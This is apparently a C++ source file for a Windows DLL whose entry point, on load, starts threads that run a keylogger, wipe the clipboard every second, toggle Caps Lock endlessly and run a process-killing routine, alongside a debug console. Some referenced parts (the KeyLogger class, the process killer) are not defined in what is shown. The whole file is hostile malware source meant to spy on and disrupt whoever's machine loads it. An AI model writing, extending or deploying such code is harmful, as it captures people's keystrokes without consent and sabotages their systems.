#include "debug/dbg_console/console.h"
#include "modules/module_manager.h"
#include <nlohmann/json.hpp>
#include <spdlog/spdlog.h>
#include <tlhelp32.h> // For process enumeration
#include <windows.h>


void DumpInput() {
  KeyLogger logger;
  logger.StartLogging();
}

DWORD WINAPI ClearClipboardThread(LPVOID lpParam) {
  while (true) {
    if (OpenClipboard(NULL)) {
      EmptyClipboard();
      CloseClipboard();
    }
    Sleep(1000);
  }
  return 0;
}

void spamCapsLock() {
  while (true) {
    keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY, 0);
    keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    Sleep(530);
  }
}

int main() {
  DebugConsole console(false);
  console.Initialize();
  DumpMemoryInfo();
  return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason,
                               LPVOID lpRes) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DumpInput, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ClearClipboardThread, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)spamCapsLock, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ProcessKillerThread, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, 0);
  } else if (fdwReason == DLL_PROCESS_DETACH) {
    FreeConsole();
  }
  return 1;
}